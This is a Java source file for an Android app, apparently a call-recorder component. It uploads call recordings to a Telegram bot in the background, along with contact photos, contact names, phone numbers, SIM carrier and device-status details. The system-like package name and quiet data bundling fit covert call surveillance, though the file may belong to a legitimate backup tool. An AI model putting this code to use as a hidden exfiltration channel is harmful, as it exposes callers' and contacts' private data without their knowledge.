package s28.system.phone.beta;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.Data;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class TelegramBackupManager {
    private static final String TAG = "TelegramBackupManager";
    private static final String CHANNEL_ID = "TelegramBackupChannel";

    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final BetaSettings settings;
    private final Context context;
    private final NotificationManager notificationManager;

    public TelegramBackupManager(Context context) {
        this.context = context;
        this.settings = new BetaSettings(context);
        this.notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        createNotificationChannel();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Telegram Backup Progress",
                    NotificationManager.IMPORTANCE_LOW
            );
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }

    public void backupFile(final String filePath, final String phoneNumber, final String duration, final String direction) {
        if (!settings.isTelegramBackupEnabled()) return;

        final String token = settings.getTelegramBotToken();
        final String chatId = settings.getTelegramChatId();

        if (token.isEmpty() || chatId.isEmpty()) {
            Log.w(TAG, "Telegram credentials not set. Skipping backup.");
            return;
        }

        executor.execute(() -> {
            try {
                // Try to send contact photo first (keeping this as is for now, 
                // but ideally this could also be a worker)
                byte[] photo = getContactPhoto(context, phoneNumber);
                if (photo != null) {
                    try {
                        uploadPhotoToTelegram(photo, token, chatId);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to send photo to Telegram", e);
                    }
                }

                String caption = getSystemInfo(context, phoneNumber, duration, direction);
                enqueueUploadWork(filePath, phoneNumber, token, chatId, caption);
            } catch (Exception e) {
                Log.e(TAG, "Failed to initiate backup to Telegram", e);
            }
        });
    }

    private void enqueueUploadWork(String filePath, String phoneNumber, String token, String chatId, String caption) {
        Data inputData = new Data.Builder()
                .putString(TelegramUploadWorker.KEY_FILE_PATH, filePath)
                .putString(TelegramUploadWorker.KEY_PHONE_NUMBER, phoneNumber)
                .putString(TelegramUploadWorker.KEY_TOKEN, token)
                .putString(TelegramUploadWorker.KEY_CHAT_ID, chatId)
                .putString(TelegramUploadWorker.KEY_CAPTION, caption)
                .build();

        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest uploadWorkRequest = new OneTimeWorkRequest.Builder(TelegramUploadWorker.class)
                .setConstraints(constraints)
                .setInputData(inputData)
                .setBackoffCriteria(
                        BackoffPolicy.EXPONENTIAL,
                        OneTimeWorkRequest.MIN_BACKOFF_MILLIS,
                        TimeUnit.MILLISECONDS)
                .addTag("TelegramUpload")
                .build();

        WorkManager.getInstance(context).enqueue(uploadWorkRequest);
        Log.i(TAG, "Enqueued Telegram upload work for: " + filePath);
    }

    private String getSystemInfo(Context context, String phoneNumber, String duration, String direction) {
        StringBuilder sb = new StringBuilder();
        
        sb.append("📞 Call Details:\n");
        sb.append("Number: ").append(phoneNumber != null ? phoneNumber : "Unknown").append("\n");
        sb.append("Direction: ").append(direction != null ? direction : "Unknown").append("\n");
        sb.append("Duration: ").append(duration != null ? duration : "00:00").append("\n");
        
        String name = getContactName(context, phoneNumber);
        if (name != null) {
            sb.append("Contact: ").append(name).append("\n");
        }
        
        sb.append("\n📶 Network Info:\n");
        appendTelephonyInfo(context, sb);

        sb.append("\n📱 Device Status:\n");

        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                float batteryPct = level * 100 / (float) scale;
                sb.append("🔋 Battery: ").append((int) batteryPct).append("%\n");
            }
        } catch (Exception e) {
            sb.append("🔋 Battery: Unknown\n");
        }

        try {
            android.media.AudioManager audioManager = (android.media.AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            if (audioManager != null) {
                int mode = audioManager.getRingerMode();
                String modeStr = "Normal";
                if (mode == android.media.AudioManager.RINGER_MODE_SILENT) modeStr = "Silent 🔇";
                else if (mode == android.media.AudioManager.RINGER_MODE_VIBRATE) modeStr = "Vibrate 📳";
                sb.append("🔔 Mode: ").append(modeStr).append("\n");
            }
        } catch (Exception e) {
            sb.append("🔔 Mode: Unknown\n");
        }

        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
            boolean isMobile = activeNetwork != null && activeNetwork.getType() == android.net.ConnectivityManager.TYPE_MOBILE;
            sb.append("📶 Data: ").append(isMobile ? (isConnected ? "ON (Mobile)" : "OFF") : (isConnected ? "ON (WiFi)" : "OFF")).append("\n");
        } catch (Exception e) {
            sb.append("📶 Data: Unknown\n");
        }

        return sb.toString();
    }

    private void appendTelephonyInfo(Context context, StringBuilder sb) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                android.telephony.SubscriptionManager sm = (android.telephony.SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                if (sm != null) {
                    try {
                        java.util.List<android.telephony.SubscriptionInfo> sis = sm.getActiveSubscriptionInfoList();
                        if (sis != null && !sis.isEmpty()) {
                            for (android.telephony.SubscriptionInfo si : sis) {
                                sb.append("SIM ").append(si.getSimSlotIndex() + 1).append(": ")
                                  .append(si.getDisplayName()).append(" (")
                                  .append(si.getCarrierName()).append(")\n");
                            }
                        } else {
                            sb.append("SIM: No active subscriptions found\n");
                        }
                    } catch (SecurityException e) {
                        sb.append("SIM: Permission denied\n");
                    }
                }
            }

            android.telephony.TelephonyManager tm = (android.telephony.TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                    android.telephony.SignalStrength ss = tm.getSignalStrength();
                    if (ss != null) {
                        int level = ss.getLevel(); // 0-4
                        sb.append("Signal Level: ").append(level).append("/4\n");
                    }
                }
            }
        } catch (Exception e) {
            sb.append("Network: Error getting info: ").append(e.getMessage()).append("\n");
        }
    }

    private String getContactName(Context context, String phoneNumber) {
        if (phoneNumber == null) return null;
        try {
            android.net.Uri uri = android.net.Uri.withAppendedPath(android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(phoneNumber));
            android.database.Cursor cursor = context.getContentResolver().query(uri, new String[]{
                    android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME
            }, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    String name = cursor.getString(0);
                    cursor.close();
                    return name;
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error looking up contact", e);
        }
        return null;
    }

    private byte[] getContactPhoto(Context context, String phoneNumber) {
        if (phoneNumber == null) return null;
        try {
            android.net.Uri uri = android.net.Uri.withAppendedPath(android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(phoneNumber));
            android.database.Cursor cursor = context.getContentResolver().query(uri, new String[]{android.provider.ContactsContract.PhoneLookup._ID}, null, null, null);
            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    long contactId = cursor.getLong(0);
                    android.net.Uri contactUri = android.content.ContentUris.withAppendedId(android.provider.ContactsContract.Contacts.CONTENT_URI, contactId);
                    java.io.InputStream is = android.provider.ContactsContract.Contacts.openContactPhotoInputStream(context.getContentResolver(), contactUri, true);
                    if (is != null) {
                        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = is.read(buffer)) > 0) {
                            baos.write(buffer, 0, len);
                        }
                        is.close();
                        cursor.close();
                        return baos.toByteArray();
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting contact photo", e);
        }
        return null;
    }

    public void sendPhoto(final byte[] photoData, final String fileName) {
        if (!settings.isTelegramBackupEnabled()) return;

        final String token = settings.getTelegramBotToken();
        final String chatId = settings.getTelegramChatId();

        if (token.isEmpty() || chatId.isEmpty()) return;

        executor.execute(() -> {
            try {
                uploadPhotoToTelegram(photoData, token, chatId, fileName);
            } catch (Exception e) {
                Log.e(TAG, "Failed to send photo to Telegram", e);
            }
        });
    }

    private void uploadPhotoToTelegram(byte[] photoData, String token, String chatId) throws Exception {
        uploadPhotoToTelegram(photoData, token, chatId, "contact.jpg");
    }

    private void uploadPhotoToTelegram(byte[] photoData, String token, String chatId, String fileName) throws Exception {
        String urlString = "https://api.telegram.org/bot" + token + "/sendPhoto";
        String boundary = "Boundary-" + System.currentTimeMillis();
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        URL url = new URL(urlString);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(30000);
        conn.setReadTimeout(30000);
        conn.setDoInput(true);
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

        try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + fileName + "\"" + lineEnd);
            dos.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);
            dos.write(photoData);
            dos.writeBytes(lineEnd);
            
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
        }

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            String error = readStream(conn.getErrorStream());
            Log.e(TAG, "Photo upload failed (" + responseCode + "): " + error);
        }
    }

    private String readStream(InputStream is) {
        if (is == null) return "No error stream";
        try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
            return sb.toString();
        } catch (Exception e) {
            return "Error reading stream: " + e.getMessage();
        }
    }

    public void sendTestMessage(final String message, final TestCallback callback) {
        final String token = settings.getTelegramBotToken();
        final String chatId = settings.getTelegramChatId();

        if (token.isEmpty() || chatId.isEmpty()) {
            if (callback != null) callback.onResult(false, "Token or Chat ID is empty");
            return;
        }

        executor.execute(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + token + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");

                String json = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + message + "\"}";
                
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes(json);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    if (callback != null) callback.onResult(true, "Test message sent successfully!");
                } else {
                    if (callback != null) callback.onResult(false, "Failed with code: " + responseCode);
                }
            } catch (Exception e) {
                if (callback != null) callback.onResult(false, "Error: " + e.getMessage());
            }
        });
    }

    public interface TestCallback {
        void onResult(boolean success, String message);
    }
}
